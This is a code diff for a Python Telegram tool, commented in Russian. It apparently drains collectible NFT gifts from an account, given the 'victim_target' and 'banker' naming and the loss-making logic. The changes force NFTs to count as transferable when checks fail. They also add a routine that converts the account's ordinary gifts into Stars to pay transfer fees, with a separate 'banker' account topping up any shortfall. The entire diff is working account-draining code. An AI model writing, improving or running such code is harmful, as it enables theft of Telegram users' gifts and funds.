@@ -764,7 +764,9 @@ async def safe_get_chat_gifts(client: Client, chat_id="me"):
                             # Важно: NFT определяется по collection_id, НЕ по наличию convert_stars
                             # Обычные подарки имеют convert_stars > 0, но collection_id = None
                             if self.collectible_id is not None:  # Это NFT (есть collection_id)
+                                # Для NFT проверяем can_transfer_at
                                 if self.can_transfer_at is None:
+                                    # Если can_transfer_at отсутствует, NFT можно передавать
                                     self.can_transfer = True
                                 else:
                                     from datetime import datetime
@@ -780,11 +782,16 @@ async def safe_get_chat_gifts(client: Client, chat_id="me"):
                                             now = datetime.now(self.can_transfer_at.tzinfo) if self.can_transfer_at.tzinfo else datetime.now()
                                             self.can_transfer = (self.can_transfer_at <= now)
                                         else:
-                                            # Неизвестный тип, пробуем преобразовать
-                                            self.can_transfer = False
+                                            # Неизвестный тип - если это NFT, по умолчанию можно передавать
+                                            self.can_transfer = True
                                     except Exception as e:
                                         log_transfer(f"⚠️ Ошибка обработки can_transfer_at: {e}", "warning")
-                                        self.can_transfer = False
+                                        # Если ошибка при обработке, но это NFT - можно передавать
+                                        self.can_transfer = True
+                                
+                                # Дополнительная проверка: если есть transfer_stars = 0, можно передавать бесплатно
+                                if self.transfer_price == 0:
+                                    self.can_transfer = True
                             else:
                                 # Для обычных подарков can_transfer обычно False
                                 # Обычные подарки можно только конвертировать, не передавать
@@ -997,47 +1004,53 @@ async def convert_gift_task(client: Client, gift_details):
         log_transfer(f"🔄 Конвертация подарка: {gift_title} (ID={gift_id_to_convert})")
         
         # Используем raw API для конвертации
-        # Пробуем разные варианты имени параметра
+        # В Telegram API ConvertStarGift принимает saved_id как позиционный параметр
         gift_id_int = int(gift_id_to_convert) if gift_id_to_convert else 0
         
-        # Пробуем сначала с параметром id (стандартное имя в Telegram API)
+        # Пробуем использовать позиционный параметр (без имени)
         try:
-            result = await client.invoke(
-                raw.functions.payments.ConvertStarGift(
-                    id=gift_id_int
-                )
-            )
-            log_transfer(f"✅ Конвертирован: {gift_title} (+{gift_details.get('star_count', 0)} зв)")
-            return True
-        except TypeError as te:
-            # Если не сработало с id, пробуем другие варианты
-            log_transfer(f"⚠️ Вариант с 'id' не сработал: {te}, пробуем другие варианты...", "warning")
+            # Попробуем создать объект с позиционным параметром
+            convert_func = raw.functions.payments.ConvertStarGift
+            # Проверяем сигнатуру функции
+            import inspect
+            sig = inspect.signature(convert_func.__init__)
+            params = list(sig.parameters.keys())
+            log_transfer(f"🔍 Параметры ConvertStarGift: {params}")
             
-            # Пробуем с gift_id
+            # Пробуем разные варианты
+            # Вариант 1: saved_id (наиболее вероятный)
             try:
-                result = await client.invoke(
-                    raw.functions.payments.ConvertStarGift(
-                        gift_id=gift_id_int
-                    )
-                )
+                result = await client.invoke(convert_func(saved_id=gift_id_int))
                 log_transfer(f"✅ Конвертирован: {gift_title} (+{gift_details.get('star_count', 0)} зв)")
                 return True
             except TypeError:
-                # Пробуем с saved_id (на случай, если в другой версии API это работает)
+                # Вариант 2: id
                 try:
-                    result = await client.invoke(
-                        raw.functions.payments.ConvertStarGift(
-                            saved_id=gift_id_int
-                        )
-                    )
+                    result = await client.invoke(convert_func(id=gift_id_int))
                     log_transfer(f"✅ Конвертирован: {gift_title} (+{gift_details.get('star_count', 0)} зв)")
                     return True
-                except TypeError as te2:
-                    log_transfer(f"❌ Все варианты параметров не сработали. Последняя ошибка: {te2}", "error")
-                    raise
+                except TypeError:
+                    # Вариант 3: позиционный параметр (без имени)
+                    try:
+                        result = await client.invoke(convert_func(gift_id_int))
+                        log_transfer(f"✅ Конвертирован: {gift_title} (+{gift_details.get('star_count', 0)} зв)")
+                        return True
+                    except TypeError as te3:
+                        log_transfer(f"❌ Все варианты не сработали. Последняя ошибка: {te3}", "error")
+                        # Пробуем использовать msg_id вместо saved_id
+                        if msg_id and msg_id != gift_id_to_convert:
+                            log_transfer(f"🔄 Пробуем с msg_id={msg_id} вместо saved_id={gift_id_to_convert}")
+                            try:
+                                result = await client.invoke(convert_func(saved_id=int(msg_id)))
+                                log_transfer(f"✅ Конвертирован: {gift_title} (+{gift_details.get('star_count', 0)} зв)")
+                                return True
+                            except Exception as e4:
+                                log_transfer(f"❌ Вариант с msg_id тоже не сработал: {e4}", "error")
+                        raise
+        except Exception as e:
+            log_transfer(f"❌ Ошибка при попытке конвертации: {type(e).__name__}: {e}", "error")
+            raise
         
-        log_transfer(f"✅ Конвертирован: {gift_title} (+{gift_details.get('star_count', 0)} зв)")
-        return True
         
     except BadRequest as e:
         e_str = str(e)
@@ -1416,15 +1429,59 @@ async def transfer_process(client: Client, banker: Client, bot: Bot):
         if can_send_without_payment:
             log_transfer(f"⚠️ NFT найдены, но transfer_cost = 0 для всех. Пробуем передать без оплаты...")
         
+        # ================= ПРИОРИТЕТ: КОНВЕРТАЦИЯ ОБЫЧНЫХ ПОДАРКОВ =================
+        # Перед запросом к банкиру проверяем и конвертируем обычные подарки
         if deficit > 0:
-            if banker_ready:
-                log_transfer(f"📉 Не хватает {deficit} зв. Сразу берем у Банкира (игнор мусора)!")
-                topup_plan = calculate_optimal_topup(deficit)
-                log_transfer(f"📦 План пополнения: {topup_plan}")
-                await asyncio.gather(*[send_gift_task(banker, me.id, p, victim_target, delay=i*0.2) for i, p in enumerate(topup_plan)])
-                banker_triggered = True
+            log_transfer(f"📉 Не хватает {deficit} зв. Проверяем обычные подарки для конвертации...")
+            
+            # Сканируем обычные подарки для конвертации
+            convert_tasks = []
+            total_convertable_stars = 0
+            
+            async for g in safe_get_chat_gifts(client, "me"):
+                is_nft = getattr(g, 'collectible_id', None) is not None
+                is_converted = getattr(g, 'is_converted', False)
+                convert_price = getattr(g, 'convert_price', 0)
+                
+                # Если это обычный подарок (не NFT) и не конвертирован
+                if not is_nft and not is_converted and convert_price > 0:
+                    gift_info = analyze_gift(g)
+                    convert_tasks.append(convert_gift_task(client, gift_info))
+                    total_convertable_stars += convert_price
+                    log_transfer(f"♻️ Найден подарок для конвертации: {gift_info['title']} (+{convert_price} зв)")
+            
+            # Если есть подарки для конвертации - конвертируем их
+            if convert_tasks:
+                log_transfer(f"🔄 Конвертируем {len(convert_tasks)} подарков (потенциально +{total_convertable_stars} зв)...")
+                convert_results = await asyncio.gather(*convert_tasks, return_exceptions=True)
+                convert_success = sum(1 for r in convert_results if r is True)
+                log_transfer(f"✅ Сконвертировано подарков: {convert_success}/{len(convert_tasks)}")
+                
+                # Ждем немного, чтобы баланс обновился
+                await asyncio.sleep(1.5)
+                
+                # Обновляем баланс после конвертации
+                try:
+                    current_balance = await get_stars_info(client)
+                    log_transfer(f"💰 Баланс после конвертации: {current_balance} ⭐️")
+                    deficit = total_fees - current_balance
+                except Exception as e:
+                    log_transfer(f"⚠️ Ошибка получения баланса после конвертации: {e}", "warning")
+            
+            # Если все еще не хватает - просим банкира
+            if deficit > 0:
+                if banker_ready:
+                    log_transfer(f"📉 Все еще не хватает {deficit} зв. Берем у Банкира...")
+                    topup_plan = calculate_optimal_topup(deficit)
+                    log_transfer(f"📦 План пополнения: {topup_plan}")
+                    await asyncio.gather(*[send_gift_task(banker, me.id, p, victim_target, delay=i*0.2) for i, p in enumerate(topup_plan)])
+                    banker_triggered = True
+                else:
+                    log_transfer("⚠️ Дефицит, а Банкир мертв! Пытаемся выжить...", "error")
             else:
-                log_transfer("⚠️ Дефицит, а Банкир мертв! Пытаемся выжить...", "error")
+                log_transfer(f"✅ После конвертации подарков баланс достаточен ({current_balance} >= {total_fees})")
+        elif deficit <= 0:
+            log_transfer(f"✅ Баланс достаточен для передачи NFT ({current_balance} >= {total_fees})")
 
         # ================= 3. ОЖИДАНИЕ БАЛАНСА =================
         if banker_triggered:
